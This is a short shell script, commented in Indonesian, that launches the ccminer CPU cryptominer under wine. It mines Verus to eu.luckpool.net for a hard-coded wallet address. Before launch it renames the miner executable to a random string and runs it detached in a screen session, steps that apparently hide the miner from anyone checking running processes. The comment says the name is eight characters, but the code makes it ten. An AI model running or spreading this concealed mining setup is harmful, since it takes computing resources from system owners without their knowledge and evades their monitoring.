chmod +x *
cd ccminer_CPU_3.8.3
random_name=$(tr -dc A-Za-z </dev/urandom | head -c 10)  # Menghasilkan nama acak sepanjang 8 karakter
mv ccminer.exe $random_name.exe
screen -d -m bash -c "wine $random_name.exe -a verus -o stratum+tcp://eu.luckpool.net:3960 -u REPNzMPtM7seJy5xngt5VWKXMsEi6Ejezb.belotloh -p d=5 -t 4"
